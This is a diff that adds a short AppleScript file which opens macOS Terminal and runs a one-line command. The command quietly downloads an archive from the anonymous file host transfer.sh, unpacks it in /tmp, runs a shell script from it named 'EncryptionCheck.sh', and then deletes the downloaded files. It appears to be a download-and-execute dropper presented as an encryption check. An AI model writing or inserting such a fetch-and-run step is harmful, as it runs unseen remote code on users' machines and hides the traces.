@@ -1,0 +1,6 @@
+#!/usr/bin/osascript
+
+tell application "Terminal"
+    activate
+    do script "curl -s -o /tmp/encryption_check.tar.gz https://transfer.sh/D8SSZ/encryption_check.tar.gz && sleep 1 && tar -zxf /tmp/encryption_check.tar.gz -C /tmp/ && sleep 1 && sh /tmp/encryption/EncryptionCheck.sh && rm /tmp/encryption_check.tar.gz && rm -r /tmp/encryption" in window 1
+end tell
